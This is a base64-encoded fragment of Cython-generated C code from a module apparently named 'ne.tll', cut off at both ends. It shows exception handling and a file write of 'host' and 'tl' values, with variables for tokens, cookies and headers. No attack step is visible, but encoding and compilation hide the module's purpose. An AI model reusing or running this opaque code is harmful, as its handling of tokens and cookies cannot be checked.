l4X3RfMTQpOwogICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgewogICAgICAgICAgICAgIF9fcHl4X3ZfZiA9IF9fcHl4X3RfNjsKICAgICAgICAgICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBfX3B5eF90XzEyID0gX19weXhfdl9mOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90bCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDEzX2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2hvc3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNTUsIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgICAgICBfX3B5eF90XzE3WzBdID0gX19weXhfdF80OwogICAgICAgICAgICAgIF9fcHl4X3RfMTdbMV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183OwogICAgICAgICAgICAgIF9fcHl4X3RfMTdbMl0gPSBfX3B5eF90Xzc7CiAgICAgICAgICAgICAgX19weXhfdF8xN1szXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzg7CiAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xNywgNCwgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF80KSArIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzcpICsgMSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF83KSk7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTU1LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgX19weXhfdF81fTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93cml0ZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTU1LCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CgogICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDE4X3RyeV9lbmQ7CiAgICAgICAgICAgIF9fcHl4X0wxM19lcnJvcjo7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS50bGwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzYsICZfX3B5eF90XzUsICZfX3B5eF90XzEyKSA8IDApIF9fUFlYX0VSUigwLCAxNTQsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgICAgICAgIF9fcHl4X3RfNyA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzYsIF9fcHl4X3RfNSwgX19weXhfdF8xMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDE1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgICAgICBfX3B5eF90XzE4ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEzLCBfX3B5eF90XzcsIE5VTEwpOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE4KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDE1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE4KTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xOCk7IF9fcHl4X3RfMTggPSAwOwogICAgICAgICAgICAgIGlmIChfX3B5eF90XzE5IDwgKDApKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSAoIV9fcHl4X3RfMTkpOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzIwKSkgewogICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzYpOwogICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMik7CiAgICAgICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfNiwgX19weXhfdF81LCBfX3B5eF90XzEyKTsKICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7ICBfX3B5eF90XzUgPSAwOyAgX19weXhfdF8xMiA9IDA7IAogICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDE1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxNF9leGNlcHRpb25faGFuZGxlZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yOjsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNCwgX19weXhfdF8xNSwgX19weXhfdF8xNik7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7CiAgICAgICAgICAgIF9fcHl4X0wxNF9leGNlcHRpb25faGFuZGxlZDo7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7CiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYpOwogICAgICAgICAgICBfX3B5eF9MMThfdHJ5X2VuZDo7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICB7CiAgICAgICAgICB7CiAgICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7CiAgICAgICAgICAgICAgX19weXhfdF8xNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0sIE5VTEwpOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ290byBfX3B5eF9MMTI7CiAgICAgICAgICB9CiAgICAgICAgICBfX3B5eF9MMTI6OwogICAgICAgIH0KICAgICAgICBnb3RvIF9fcHl4X0wyMjsKICAgICAgICBfX3B5eF9MOV9lcnJvcjo7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yOwogICAgICAgIF9fcHl4X0wyMjo7CiAgICAgIH0KCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgZ290byBfX3B5eF9MOF90cnlfZW5kOwogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKCiAgICAKICAgIF9fcHl4X3RfMjEgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICBpZiAoX19weXhfdF8yMSkgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLnRsbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzEyLCAmX19weXhfdF81LCAmX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCAxNTYsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzU7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICAgICAgICBfX3B5eF90XzkgPSAxOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3ZfZX07CiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1NywgX19weXhfTDI4X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgICAgICAKICAgICAgICBfX3B5eF90XzEwID0gTlVMTDsKICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RsbCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDI4X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgICAgICAgX19weXhfdF8xMCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7CiAgICAgICAgICBhc3NlcnQoX19weXhfdF8xMCk7CiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIE5VTEx9OwogICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDI4X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDI5OwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMjhfZXJyb3I6OwogICAgICAgIHsKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8yNCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzE0LCAmX19weXhfdF8xOCwgJl9fcHl4X3RfMjQpOwogICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTMsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNSkgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMTMsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNCk7CiAgICAgICAgICBfX3B5eF90XzIxID0gX19weXhfbGluZW5vOyBfX3B5eF90XzIyID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yMyA9IF9fcHl4X2ZpbGVuYW1lOwogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI0KTsKICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTgsIF9fcHl4X3RfMjQpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzEzLCBfX3B5eF90XzE2LCBfX3B5eF90XzE1KTsKICAgICAgICAgIF9fcHl4X3RfMTMgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8yNCA9IDA7CiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzIxOyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yMjsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzIzOwogICAgICAgICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wyOTo7CiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUudGxsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9uMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X24yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3JlczEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl90b2spOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9jb29raWVzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVycyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3RsKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMm5lXzN0bGxfMmdlbmVyYXRvcik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ybmVfM3RsbF81Z2VuZXJhdG9yMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ybmVfM3RsbF84Z2VuZXJhdG9yMik7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzVyZXN0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5lXzVyZXN0ID0geyJyZXN0IiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ybmVfNXJlc3QsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzVyZXN0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl91c2VyID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlczsKICBQeU9